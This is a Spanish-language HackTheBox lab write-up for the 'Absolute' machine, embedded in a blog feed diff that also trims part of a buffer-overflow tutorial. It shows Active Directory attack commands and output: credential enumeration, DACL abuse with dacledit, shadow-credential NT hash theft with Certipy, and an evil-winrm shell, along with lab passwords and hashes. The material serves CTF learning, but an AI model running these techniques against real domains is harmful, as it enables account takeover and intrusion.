+  <li>Como por <code class="language-plaintext highlighter-rouge">kerberos</code> las credenciales son correctas podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code> recursos compartidos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
+SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
+SMB         10.10.11.181    445    DC               Share           Permissions     Remark
+SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
+SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
+SMB         10.10.11.181    445    DC               Shared
+SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno no hay nada interesante algo que podemos hacer es usar el protocolo <code class="language-plaintext highlighter-rouge">ldap</code> para enumerar usuarios del dominio mediante al autenticación de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec ldap 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--users</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAP        10.10.11.181    389    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
+LDAP        10.10.11.181    389    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total of records returned 20
+LDAP        10.10.11.181    389    DC               Administrator                  Built-in account <span class="k">for </span>administering the computer/domain
+LDAP        10.10.11.181    389    DC               Guest                          Built-in account <span class="k">for </span>guest access to the computer/domain
+LDAP        10.10.11.181    389    DC               krbtgt                         Key Distribution Center Service Account
+LDAP        10.10.11.181    389    DC               J.Roberts
+LDAP        10.10.11.181    389    DC               M.Chaffrey
+LDAP        10.10.11.181    389    DC               D.Klay
+LDAP        10.10.11.181    389    DC               s.osvald
+LDAP        10.10.11.181    389    DC               j.robinson
+LDAP        10.10.11.181    389    DC               n.smith
+LDAP        10.10.11.181    389    DC               m.lovegod
+LDAP        10.10.11.181    389    DC               l.moore
+LDAP        10.10.11.181    389    DC               c.colt
+LDAP        10.10.11.181    389    DC               s.johnson
+LDAP        10.10.11.181    389    DC               d.lemm
+LDAP        10.10.11.181    389    DC               svc_smb                        AbsoluteSMBService123!
+LDAP        10.10.11.181    389    DC               svc_audit
+LDAP        10.10.11.181    389    DC               winrm_user                     Used to perform simple network tasks
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos nuevas credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D.Klay:Darkmoonsky248girl
+svc_smb:AbsoluteSMBService123!
+</code></pre></div></div>
+
+<ul>
+  <li>Si las revisamos vemos que son correctas usando el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
+</code></pre></div></div>
+
+<h2 id="mlovegod">m.lovegod</h2>
+
+<ul>
+  <li>Podemos volver a listar recursos compartidos por el protocoló <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
+SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
+SMB         10.10.11.181    445    DC               Share           Permissions     Remark
+SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
+SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
+SMB         10.10.11.181    445    DC               Shared          READ
+SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a conectarnos para ver que hay dentro de <code class="language-plaintext highlighter-rouge">shared</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient <span class="nt">-k</span> absolute.htb/svc_smb:<span class="s1">'AbsoluteSMBService123!'</span>@dc.absolute.htb
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+Type <span class="nb">help </span><span class="k">for </span>list of commands
+<span class="c"># use Shared</span>
+<span class="c"># ls</span>
+drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 <span class="nb">.</span>
+drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 ..
+<span class="nt">-rw-rw-rw-</span>         72  Thu Sep  1 12:02:23 2022 compiler.sh
+<span class="nt">-rw-rw-rw-</span>      67584  Thu Sep  1 12:02:23 2022 test.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a descargar los 2 archivos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mget *</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading compiler.sh
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading test.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos un ejecutable y un script en <code class="language-plaintext highlighter-rouge">bash</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content file test.exe
+test.exe: PE32+ executable <span class="o">(</span>GUI<span class="o">)</span> x86-64 <span class="o">(</span>stripped to external PDB<span class="o">)</span>, <span class="k">for </span>MS Windows, 11 sections
+➜  content <span class="nb">cat </span>compiler.sh
+<span class="c">#!/bin/bash</span>
+
+nim c <span class="nt">-d</span>:mingw <span class="nt">--app</span>:gui <span class="nt">--cc</span>:gcc <span class="nt">-d</span>:danger <span class="nt">-d</span>:strip <span class="nv">$1</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> la <code class="language-plaintext highlighter-rouge">IP</code> y dominios de la máquina victima.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/hosts.png" />
+</p>
+
+<ul>
+  <li>Vamos correr la <code class="language-plaintext highlighter-rouge">VPN</code> de <code class="language-plaintext highlighter-rouge">HackTheBox</code> en la máquina <code class="language-plaintext highlighter-rouge">Windows</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/vpn.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora vamos a pasar el <code class="language-plaintext highlighter-rouge">.exe</code> a la máquina Windows.</p>
+  </li>
+  <li>
+    <p>Como no sabemos que hace el <strong>.exe</strong> vamos a ponernos a interceptar el trafico con <code class="language-plaintext highlighter-rouge">Wireshark</code>.</p>
+  </li>
+  <li>
+    <p>Al momento de ejecutar el binario y estar capturando con <code class="language-plaintext highlighter-rouge">Wireshark</code> encontramos credenciales.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/creds.png" />
+</p>
+
+<ul>
+  <li>Nos dice que no son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'mlovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>lovegod: KDC_ERR_C_PRINCIPAL_UNKNOWN
+</code></pre></div></div>
+
+<ul>
+  <li>Si les ponemos un punto funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb absolute.htb <span class="nt">-u</span> <span class="s1">'m.lovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
+SMB         absolute.htb    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         absolute.htb    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\m</span>.lovegod:AbsoluteLDAP2022!
+</code></pre></div></div>
+
+<ul>
+  <li>Para enumerar el <code class="language-plaintext highlighter-rouge">DC</code> vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content bloodhound-python <span class="nt">-u</span> m.lovegod <span class="nt">-p</span> AbsoluteLDAP2022! <span class="nt">-k</span> <span class="nt">-c</span> All <span class="nt">-d</span> absolute.htb <span class="nt">-dc</span> dc.absolute.htb <span class="nt">-ns</span> 10.10.11.181 <span class="nt">--zip</span>
+INFO: Found AD domain: absolute.htb
+INFO: Getting TGT <span class="k">for </span>user
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="k">in </span>the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 18 <span class="nb">users
+</span>INFO: Found 55 <span class="nb">groups
+</span>INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.absolute.htb
+INFO: Done <span class="k">in </span>00M 23S
+INFO: Compressing output into 20240618211316_bloodhound.zip
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">sudo </span>neo4j start
+Directories <span class="k">in </span>use:
+home:         /usr/share/neo4j
+config:       /usr/share/neo4j/conf
+logs:         /etc/neo4j/logs
+plugins:      /usr/share/neo4j/plugins
+import:       /usr/share/neo4j/import
+data:         /etc/neo4j/data
+certificates: /usr/share/neo4j/certificates
+licenses:     /usr/share/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+Started neo4j <span class="o">(</span>pid:39754<span class="o">)</span><span class="nb">.</span> It is available at http://localhost:7474
+There may be a short delay <span class="k">until </span>the server is ready.
+
+➜  ~ bloodhound &amp;&gt; /dev/null &amp; <span class="nb">disown</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a marcar los usuarios que ya tenemos comprometidos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/klay.png" />
+</p>
+
+<ul>
+  <li>Si vamos a <code class="language-plaintext highlighter-rouge">Shortest Paths</code> y seleccionamos el usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> encontramos una forma de convertirnos en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/4.png" />
+</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">m.lovegod</code> tiene el privilegio <code class="language-plaintext highlighter-rouge">owns</code> en el grupo <code class="language-plaintext highlighter-rouge">GenericWrite</code>.</li>
+</ul>
+
+<blockquote>
+  <p>El privilegio “Owns” dentro del grupo “GenericWrite” le otorga al usuario la capacidad de modificar la mayoría de los atributos del objeto, administrar el objeto y delegar permisos a otros usuarios, con ciertas excepciones.</p>
+</blockquote>
+
+<ul>
+  <li>El usuario el cual es nuestro objetivo es parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/5.png" />
+</p>
+
+<h2 id="mlovegod-to-network-audit">m.lovegod to Network Audit</h2>
+
+<ul>
+  <li>Estuve muchas horas tratando de solucionar los errores para empezar tuve que hacer los mismos pasos 3 veces para llegar a obtener el hash NT de <strong>winrm_user</strong> pero esto fue lo que hice.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/resolv.conf
+<span class="c"># Generated by NetworkManager</span>
+nameserver 10.10.11.181
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /usr/share/samba/setup/krb5.conf
+<span class="o">[</span>libdefaults]
+	default_realm <span class="o">=</span> ABSOLUTE.HTB
+	dns_lookup_realm <span class="o">=</span> <span class="nb">false
+	</span>dns_lookup_kdc <span class="o">=</span> <span class="nb">true</span>
+
+<span class="o">[</span>realms]
+<span class="k">${</span><span class="nv">REALM</span><span class="k">}</span> <span class="o">=</span> ABSOLUTE.HTB <span class="o">=</span> <span class="o">{</span>
+		kdc <span class="o">=</span> dc.absolute.htb
+		admin_server <span class="o">=</span> dc.absolute.htb
+		default_domain <span class="o">=</span> absolute.htb
+	  <span class="o">}</span>
+
+<span class="o">[</span>domain_realm]
+	<span class="k">${</span><span class="nv">HOSTNAME</span><span class="k">}</span> <span class="o">=</span> <span class="k">${</span><span class="nv">REALM</span><span class="k">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>En <code class="language-plaintext highlighter-rouge">bloodhound</code> nos dicen que podemos usar <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s</a> para agregar al usuario.</p>
+  </li>
+  <li>
+    <p>También podemos hacerlo desde nuestra máquina Linux con los pasos que nos dicen en bloodhound.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/f.png" />
+</p>
+
+<ul>
+  <li>
+    <p><a href="https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py">https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py</a></p>
+  </li>
+  <li>
+    <p><a href="https://github.com/ShutdownRepo/impacket.git">https://github.com/ShutdownRepo/impacket.git</a>.</p>
+  </li>
+  <li>
+    <p>Ahora obtendremos control total del grupo Network Audit para el usuario m.lovegod.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 dacledit.py <span class="nt">-k</span> <span class="nt">-no-pass</span> absolute.htb/m.lovegod <span class="nt">-dc-ip</span> dc.absolute.htb <span class="nt">-principal</span> m.lovegod <span class="nt">-target</span> <span class="s2">"Network Audit"</span> <span class="nt">-action</span> write <span class="nt">-rights</span> FullControl
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL backed up to dacledit-20240619-000424.bak
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL modified successfully!
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora agregamos el usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content net rpc group addmem <span class="s2">"Network Audit"</span> m.lovegod <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
+</code></pre></div></div>
+
+<ul>
+  <li>Comprobamos que el usuario esta en el grupo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content net rpc group members <span class="s2">"Network Audit"</span> <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
+absolute<span class="se">\m</span>.lovegod
+absolute<span class="se">\s</span>vc_audit
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a generar un TGT y lo exportamos como variable para después autenticarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>m.lovegod.ccache
+➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
+</code></pre></div></div>
+
+<ul>
+  <li>En este punto deberíamos de tener <code class="language-plaintext highlighter-rouge">GenericWrite</code> en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code> podemos usar <code class="language-plaintext highlighter-rouge">certipy</code> para obtener el <code class="language-plaintext highlighter-rouge">TGT</code> del usuario <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad shadow auto <span class="nt">-u</span> absolute.htb/m.lovegod@dc.absolute.htb <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-target</span> dc.absolute.htb <span class="nt">-account</span> winrm_user
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'winrm_user'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'winrm_user'</span> with the certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: winrm_user@absolute.htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'winrm_user.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>: 8738c7413a5da3bc1d083efc0ab06cb2
+</code></pre></div></div>
+
+<h2 id="winrm_user">winrm_user</h2>
+
+<ul>
+  <li>Ahora nos conectamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>winrm_user.ccache
+➜  content evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Podemos leer la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
+7db70aea6e4e1e5f4b858e1136fdc263
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>
+    <p>Para enumerar el sistema podemos usar winpeas <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</a>.</p>
+  </li>
+  <li>
+    <p>La máquina en lo persona falla demasiado así que tuve que hacer lo mismo varias veces hasta para ejecutar el <code class="language-plaintext highlighter-rouge">winPEASx64.exe</code>.</p>
+  </li>
+  <li>
+    <p>Tenia mucho este error.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc_consolidate<span class="o">()</span>: unaligned fastbin chunk detected
+<span class="o">[</span>1]    109301 IOT instruction  evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Gatogamer_account/Absolute/content/winPEASx64.exe
+
+Info: Uploading /home/miguel/Hackthebox/Absolute/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe
+
+Data: 3183272 bytes of 3183272 bytes copied
+
+Info: Upload successful!
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno tenemos que hacer esta explotación <a href="https://github.com/cube0x0/KrbRelay">https://github.com/cube0x0/KrbRelay</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/zi.png" />
+</p>
+
+<h2 id="ultima-parte">Ultima parte</h2>
+
+<blockquote>
+  <p>Como la máquina me esta dando demasiados errores la escalada de privilegios que consiste en hacer un KrbRelay la pueden encuntrar en el post de mi compañero <a href="https://xchg2pwn.github.io/hackthebox/absolute/">https://xchg2pwn.github.io/hackthebox/absolute/</a></p>
+</blockquote>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Fulcrum (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html" rel="alternate" type="text/html" title="HackTheBox - Fulcrum (insane)" /><published>2024-06-15T00:00:00-06:00</published><updated>2024-06-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/31252a37873dc31f600f40de91dd52d6.png" />
 </p>
 
@@ -8916,764 +9734,4 @@ SMB         10.10.10.103    445    SIZZLE           SIZZLE<span class="nv">$:</s
 2551eafa119b3d4d6c7e1e28db9dec74
 C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>rlky<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
 e1c1537f865b3f1aad46459eb491e08a
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Buffer Overflow For Beginners and Ret2libc</title><link href="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" rel="alternate" type="text/html" title="Buffer Overflow For Beginners and Ret2libc" /><published>2024-05-03T00:00:00-06:00</published><updated>2024-05-03T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub/machines/2024/05/03/buffer</id><content type="html" xml:base="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"><![CDATA[<p align="center">
-<img src="/assets/vulnhub/buff/icon.png" />
-</p>
-
-<h2 id="level-one">Level One</h2>
-
-<blockquote>
-  <p>Comparación de caracteres.</p>
-</blockquote>
-
-<blockquote>
-  <p>Vamos a desactivar el ASRL temporalmente.</p>
-</blockquote>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
-0
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Lo primero que vamos hacer es analizar el código que esta escrito en C.</p>
-  </li>
-  <li>
-    <p>Vemos que se esta definiendo un Buffer de tamaño 32 bytes, esta asignado una variable <code class="language-plaintext highlighter-rouge">long key</code> con valor <code class="language-plaintext highlighter-rouge">0x12345678</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/1.png" />
-</p>
-
-<ul>
-  <li>Esta es la parte interesante ya que vemos que si se igual el valor <code class="language-plaintext highlighter-rouge">key</code> a <code class="language-plaintext highlighter-rouge">0x42424242</code> se va ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es el objetivo en caso de que no sea ese valor no se hará nada.</li>
-</ul>
-
-<pre><code class="language-C">if(key == 0x42424242) {
-        execve("/bin/sh", 0, 0);
-    }
-    else {
-        printf("%s\n", "Sorry try again...");
-    }
-</code></pre>
-
-<ul>
-  <li>Para saber a cuanto equivale el valor <code class="language-plaintext highlighter-rouge">key</code> podemos hacerlo desde <code class="language-plaintext highlighter-rouge">bash</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">42"</span>
-B%
-</code></pre></div></div>
-
-<ul>
-  <li>
